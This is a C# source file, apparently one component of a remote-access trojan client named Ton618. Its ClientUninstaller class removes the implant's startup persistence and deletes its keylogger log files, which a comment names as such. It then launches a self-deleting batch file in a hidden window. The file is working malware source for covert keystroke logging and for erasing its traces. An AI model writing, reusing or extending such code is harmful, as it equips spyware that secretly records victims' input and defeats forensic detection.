﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Ton618.Config;
using Ton618.IO;

namespace Ton618.Setup
{
    public class ClientUninstaller : ClientSetupBase
    {
        public void Uninstall()
        {
            if (Settings.STARTUP)
            {
                var clientStartup = new ClientStartup();
                clientStartup.RemoveFromStartup(Settings.STARTUPKEY);
            }

            if (Settings.ENABLELOGGER && Directory.Exists(Settings.LOGSPATH))
            {
                // this must match the keylogger log files
                var reg = new Regex(@"^\d{4}\-(0[1-9]|1[012])\-(0[1-9]|[12][0-9]|3[01])$");

                foreach (var logFile in Directory.GetFiles(Settings.LOGSPATH, "*", SearchOption.TopDirectoryOnly)
                    .Where(path => reg.IsMatch(Path.GetFileName(path))).ToList())
                {
                    try
                    {
                        File.Delete(logFile);
                    }
                    catch (Exception)
                    {
                        // no important exception
                    }
                }
            }

            var batchFile = BatchFile.CreateUninstallBatch(Application.ExecutablePath);

            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                FileName = batchFile
            };
            Process.Start(startInfo);
        }
    }
}
